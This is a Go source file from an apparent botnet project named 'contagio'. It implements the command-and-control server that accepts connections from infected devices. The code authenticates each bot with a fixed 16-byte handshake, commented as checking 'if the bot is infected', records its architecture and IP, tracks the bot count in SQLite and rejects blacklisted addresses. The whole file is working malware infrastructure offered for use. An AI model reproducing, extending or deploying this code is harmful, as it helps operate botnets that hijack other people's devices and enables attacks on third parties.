package bot_server

import (
	"bytes"
	"contagio/contagio/config"
	"contagio/contagio/config/logging"
	"contagio/contagio/database/sqlite"
	"io"
	"net"
	"strings"
	"sync"
	"time"
)

type Bot struct {
	Conn net.Conn
	I    BotInfo
}
type BotInfo struct {
	Arch string
	IP   string
}

var BotCount int
var BotsList sync.Map

func StartBotServer(conf *config.Config) {
	defer catch()

	serv, err := net.Listen("tcp", conf.BotServer)
	if err != nil {
		logging.PrintError("Bot server fatal error: " + err.Error())
		conf.Wg.Done()
		return
	}

	logging.PrintInfo("Bot server ready: " + conf.BotServer)

	for {
		bot, err := serv.Accept()
		if err != nil {
			continue
		}

		b, inf := initBot(bot)
		if !inf {
			continue
		}

		go b.newbot()

	}

}

func (bot *Bot) newbot() {
	defer catch()
	BotCount++
	sqlite.AddBot(BotCount)
	go bot.Handle()

	if !config.Disable_Debug {
		logging.PrintInfo("New bot connected: " + bot.Conn.RemoteAddr().String())
	}
	BotsList.Store(bot.I.IP, bot)
}

func (bot *Bot) Handle() {
	defer bot.Conn.Close()

	buf := make([]byte, 1<<10)

	for {
		n, err := bot.Conn.Read(buf)
		if err != nil || n == 0 {
			break
		}
		_, err = bot.Conn.Write(buf[0:n])
		if err != nil {
			break
		}
		_, err = io.Copy(bot.Conn, bot.Conn)
		if err != nil {
			break
		}
	}
	BotCount--
	sqlite.AddBot(BotCount)
	BotsList.Delete(bot.I.IP)

}

func initBot(Conn net.Conn) (*Bot, bool) {

	defer catch()

	// check if the bot is infected

	Conn.SetDeadline(time.Now().Add(10 * time.Second))

	buf := make([]byte, 16)

	_, err := Conn.Read(buf)
	if err != nil {
		logging.PrintWarning("Read error: " + err.Error())
		Conn.Close()
		return &Bot{}, false
	}

	if !bytes.Equal(buf, []byte{2, 250, 15, 193, 3, 244, 243, 250, 15, 193, 0, 0, 3, 120, 56, 54}) {

		Conn.Close()
		return &Bot{}, false
	}

	Conn.SetDeadline(time.Now().Add(10 * time.Second))

	buf = make([]byte, 100)

	n, err := Conn.Read(buf)
	if err != nil {
		Conn.Close()
		return &Bot{}, false
	}

	if IsBlacklisted(strings.Split(Conn.RemoteAddr().String(), ":")[0]) {
		logging.PrintInfo("Blacklisted ip: " + strings.Split(Conn.RemoteAddr().String(), ":")[0])
		Send("BLACKLISTED", Conn)
		Conn.Close()
		return &Bot{}, false
	}

	Conn.SetDeadline(time.Time{})

	return &Bot{
		Conn: Conn,
		I: BotInfo{
			Arch: string(buf[:n]),
			IP:   strings.Split(Conn.RemoteAddr().String(), ":")[0],
		},
	}, true

}
